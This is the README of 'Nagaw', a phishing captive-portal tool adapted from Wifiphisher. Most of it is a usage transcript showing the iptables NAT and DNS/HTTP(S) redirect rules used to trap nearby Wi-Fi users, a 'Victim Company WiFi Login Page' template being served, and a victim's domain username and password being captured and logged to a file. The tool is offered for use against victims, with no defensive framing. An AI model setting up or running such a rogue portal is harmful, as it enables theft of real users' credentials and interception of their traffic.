# Nagaw
Nagaw is a simple yet effective captive portal tool coded in Python. 

The code was taken from Wifiphisher tool (all credits go to the original authors) and modified and adapted to be used separately.

# Example of Use:
```
bransh@hsnarb:~/DEV/nagaw$ sudo python nagaw.py -i wlan1 -o wlan0 -t demo -d
[*] Starting at 2019-05-19 22:18 ...
[*] Starting dnsmasq ...
[*] Cleaning iptables rules from the system ...
[D] Executing the following commands: 
    iptables -F
    iptables -X
    iptables -t nat -F
    iptables -t nat -X
[*] Configuring NAT for providing Internet via wlan0 ...
[D] Executing the following commands: 
    iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
    iptables -A FORWARD -i wlan1 -o wlan0 -j ACCEPT
[D] Executing the following command: 
    sysctl -w net.ipv4.ip_forward=1
[*] Configuring iptables for redirecting HTTP(s) to this host ...
[D] Executing the following commands: 
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:443
    iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 10.0.0.1:53
    iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 10.0.0.1:53
[D] Executing the following command: 
    sysctl -w net.ipv4.conf.all.route_localnet=1
[*] Loading phishing scenarios from /home/bransh/SHARED/DEV/nagaw/template-pages ...
[*] Selecting "Victim Company WiFi Login Page" template ...
[*] Starting HTTP/HTTPS server at ports 80/443 ...
[+] New victim(s):
    MAC: xx:xx:xx:xx:xx:xx / IP: 10.0.0.14
[+] GET request from 10.0.0.14 for http://captive.apple.com/hotspot-detect.html
[+] GET request from 10.0.0.14 for http://captive.apple.com/hotspot-detect.html
[+] GET request from 10.0.0.14 for http://captive.apple.com/fonts/glyphicons-halflings-regular.woff
[+] GET request from 10.0.0.14 for http://captive.apple.com/fonts/glyphicons-halflings-regular.ttf
[+] GET request from 10.0.0.14 for http://captive.apple.com/fonts/glyphicons-halflings-regular.svg
[+] GET request from 10.0.0.14 for http://captive.apple.com/hotspot-detect.html
[D] POST request from 10.0.0.14 for http://captive.apple.com/login
[D] POST request from 10.0.0.14 with body: {u'username': u'bransh.local\\bransh', u'password': u'fromiphone'}
[D] Got credentials (callback) ...
[D] Attempting to log credentials in file ...
[*] Credentials saved on /home/bransh/DEV/nagaw/_nagaw_credentials_20190519_2218.log ...
[+] New Credentials obtained from 10.0.0.14 :
    -> {u'username': u'bransh.local\\bransh', u'password': u'fromiphone'}
[*] Providing internet access to 10.0.0.14 ...
[D] Executing the following command: 
    iptables -t nat -I PREROUTING 1 -p tcp -s 10.0.0.14 -j ACCEPT
```

# Considerations
This mini-tool leverages dnsmasq under the hood to provide DHCP service to victims, therefore make sure to have it installed on your system before using it.
